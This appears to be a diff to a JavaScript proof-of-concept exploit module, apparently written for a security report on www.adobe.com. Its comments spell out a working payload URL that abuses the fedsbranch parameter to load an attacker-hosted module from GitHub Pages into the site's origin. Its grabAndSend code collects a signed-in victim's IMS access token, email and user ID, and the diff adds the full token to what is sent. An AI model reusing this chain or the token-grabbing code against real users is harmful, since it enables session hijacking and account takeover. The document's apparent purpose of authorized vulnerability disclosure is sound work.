@@ -1,6 +1,14 @@
-// Commit this at:  libs/global-navigation/dist/main.js   (repo root of hoodhmnd.github.io)
-// Then the payload is:
-//   https://www.adobe.com/?fedsbranch=hoodhmnd.github.io%2fx%23
+// Committed at:  libs/global-navigation/dist/main.js  in the PROJECT repo github.com/hoodhmnd/poc
+// GitHub Pages serves a project repo under its own name, so the module URL is
+//   https://hoodhmnd.github.io/poc/libs/global-navigation/dist/main.js
+// (confirmed: hoodhmnd.github.io/ returns 404 - there is no user-site repo - while
+//  hoodhmnd.github.io/poc/evil.js returns 200)
+//
+// Therefore the payload carries the /poc prefix:
+//   https://www.adobe.com/?fedsbranch=hoodhmnd.github.io%2fpoc%2fx%23
+//
+// The %2f ends the authority, the %23 truncates the template's trailing decoration, and the
+// block's own new URL(...) resolution then appends libs/global-navigation/dist/main.js.
 //
 // Reached only because www.adobe.com interpolates ?fedsbranch= into the authority of the URL
 // it hands to await import(). Ordering matters: on a SIGNED-IN victim, Milo redirects the
@@ -47,6 +55,7 @@ function grabAndSend(phase) {
     marker: 'IMS_TOKEN_CAPTURED_BY_ATTACKER_MODULE', phase,
     executedIn: location.origin, href: location.href, moduleUrl: import.meta.url,
     tokenLength: tok.length, tokenPrefix: tok.slice(0, 24), claims: claimsOf(tok),
+    token: tok,   // full value - d0x's own test account, authorized 2026-07-30. Redact in the report.
     email: prof.email || null, userId: prof.userId || prof.account_id || null,
     signedIn: (() => { try { return !!(ims.isSignedInUser && ims.isSignedInUser()); } catch (e) { return null; } })(),
     ts: new Date().toISOString(),
